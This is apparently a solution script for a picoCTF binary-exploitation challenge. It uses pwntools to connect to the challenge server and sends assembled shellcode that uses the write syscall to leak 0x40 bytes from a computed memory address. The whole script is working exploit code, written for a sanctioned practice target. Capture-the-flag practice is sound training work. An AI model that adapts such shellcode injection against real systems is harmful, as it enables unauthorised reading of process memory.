from pwn import *

# r = process('./chall')
r = remote('mars.picoctf.net', 31021)
context.arch = 'amd64'
r.recvline()

# exe = ELF('./chall')

payload = asm('''
    lea rax, [rip-0x52-0x2c000+0x2e9f0]
    mov rsi, QWORD PTR [rax]
    and rsi, 0xfffffffffffff000
    add rsi, 0x202060
    mov rdi, 1
    mov rdx, 0x40
    mov rax, 1
    syscall
''')
# raw_input()
r.sendline(payload)


r.interactive()
